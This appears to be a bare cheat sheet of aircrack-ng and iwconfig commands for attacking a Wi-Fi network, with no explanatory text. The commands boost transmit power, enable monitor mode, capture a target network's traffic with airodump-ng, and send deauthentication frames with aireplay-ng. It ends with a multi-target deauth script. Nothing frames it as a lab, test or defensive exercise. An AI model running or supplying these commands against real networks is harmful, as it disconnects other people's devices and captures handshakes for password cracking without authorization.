```
iwconfig
```
```
ifconfig wlan0 down
```
```
iwconfig wlan0 txpower 30
```
```
ifconfig wlan0 up
```
```
sudo airmon-ng start wlan0
```
```
sudo airodump-ng wlan0mon --band abg -w dump
```
```
airodump-ng wlan0mon --band abg -w target --essid 06:0F:A5:2F:13:37 --channel 11
```
---

```
sudo aireplay-ng -0 5 -a ACCESSPOINT-BSSID -c CLIENT-BSSID wlan0mon
```
```
./multideauth.sh
```
